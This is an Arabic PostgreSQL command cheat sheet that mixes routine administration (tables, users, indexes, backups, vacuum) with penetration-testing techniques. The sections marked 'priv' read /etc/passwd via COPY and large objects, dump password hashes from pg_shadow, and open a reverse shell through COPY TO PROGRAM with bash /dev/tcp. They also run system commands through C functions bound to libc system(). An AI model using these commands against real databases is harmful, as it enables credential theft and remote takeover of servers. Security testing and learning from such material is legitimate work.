قواعد البيانات
-- عرض كل قواعد البيانات SELECT datname FROM pg_database; -- إنشاء قاعدة بيانات CREATE DATABASE mydb; -- حذف قاعدة بيانات DROP DATABASE mydb; -- حجم قاعدة البيانات SELECT pg_size_pretty(pg_database_size('mydb'));
📋
الجداول
-- إنشاء جدول CREATE TABLE employees ( id SERIAL PRIMARY KEY, name VARCHAR(100) NOT NULL, salary NUMERIC(9,2) ); -- عرض الجداول SELECT tablename FROM pg_tables WHERE schemaname='public'; -- حذف جدول DROP TABLE IF EXISTS employees;
👤
المستخدمون والصلاحيات
-- عرض كل المستخدمين SELECT usename, usesuper, usecreatedb FROM pg_user; -- إنشاء مستخدم CREATE USER alice WITH PASSWORD 'pass123'; -- منح صلاحيات GRANT ALL PRIVILEGES ON DATABASE mydb TO alice; GRANT ALL ON ALL TABLES IN SCHEMA public TO alice; -- سحب صلاحيات REVOKE ALL ON employees FROM alice;
-- تغيير كلمة مرور \password username -- ترقية لـ superuser ALTER USER alice WITH SUPERUSER; -- كشف hashes كلمات المرور SELECT usename, passwd FROM pg_shadow; -- ⚠️ يتطلب superuser -- حذف مستخدم DROP USER alice;
✏️
CRUD — إضافة، قراءة، تعديل، حذف
-- إضافة بيانات INSERT INTO employees (name, salary) VALUES ('Ahmed', 5000); -- قراءة بشرط SELECT * FROM employees WHERE salary >= 5000 ORDER BY name LIMIT 10; -- تعديل (آمن مع BEGIN) BEGIN; UPDATE employees SET salary=6000 WHERE name='Ahmed'; COMMIT; -- أو ROLLBACK
-- حذف بشرط DELETE FROM employees WHERE id = 5; -- عد الصفوف SELECT COUNT(*) FROM employees; -- Nth صف SELECT * FROM employees ORDER BY id LIMIT 1 OFFSET 4; -- الصف 5
⚡
الفهارس (Indexes)
-- إنشاء فهرس CREATE INDEX idx_name ON employees USING btree (name ASC); -- فهرس فريد CREATE UNIQUE INDEX idx_email ON users(email); -- عرض الفهارس \di -- حذف فهرس DROP INDEX idx_name;
📁
عمليات الملفات (COPY) priv
-- قراءة ملف CREATE TABLE tmp(t text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; -- كتابة ملف COPY (SELECT 'data') TO '/tmp/out.txt'; -- تنفيذ أوامر النظام COPY (SELECT '') TO PROGRAM 'id'; -- قراءة ملف مباشرة SELECT pg_read_file('/etc/passwd');
💥
تنفيذ الأوامر (RCE) priv
-- COPY TO PROGRAM COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/IP/4444 0>&1'; -- دالة C مخصصة CREATE TABLE tmp(data text); -- بعد رفع الـ .so CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT; SELECT sys('id'); -- libc system() CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT;

🔍
الاستكشاف (Enumeration)
-- جميع قواعد البيانات SELECT datname FROM pg_database; -- عثور على أعمدة حساسة SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%' OR column_name LIKE '%token%'; -- Superusers SELECT usename FROM pg_user WHERE usesuper = true; -- الامتدادات المثبتة SELECT extname, extversion FROM pg_extension;

النسخ الاحتياطي والاستعادة
# نسخ قاعدة بيانات pg_dump mydb > mydb.sql # نسخ بصيغة مخصصة pg_dump -Fc mydb > mydb.dump # نسخ كل قواعد البيانات pg_dumpall > all.sql # استعادة psql -U postgres -f mydb.sql pg_restore -d mydb mydb.dump

الصيانة
-- تنظيف الفضاء VACUUM employees; VACUUM(verbose, analyze) employees; -- تحديث الإحصائيات ANALYZE employees; -- إيقاف استعلام SELECT pg_cancel_backend(pid); -- مراقبة الجلسات SELECT pid, usename, state, query FROM pg_stat_activity;

Large Objects priv
-- إنشاء large object SELECT lo_create(12345); -- استيراد ملف SELECT lo_import('/etc/passwd', 12345); -- قراءة SELECT convert_from(lo_get(12345),'UTF8'); -- تصدير SELECT lo_export(12345, '/tmp/file'); -- حذف SELECT lo_unlink(12345);

⚠️
أخطاء الإعداد الشائعة
  • بيانات الدخول الافتراضية postgres:postgres
  • كلمات مرور ضعيفة
  • superuser متاح عن بعد
  • pg_hba.conf يسمح بـ trust auth
  • بدون SSL/TLS
  • COPY PROGRAM مفعّل لغير superuser
  • امتدادات غير ضرورية مثبتة
  • التسجيل (logging) معطّل
  • إصدار قديم من PostgreSQL
  • بدون حدود للاتصالات
📍

  • SHOW hba_file;
  • SHOW data_directory;
  • SHOW log_directory;
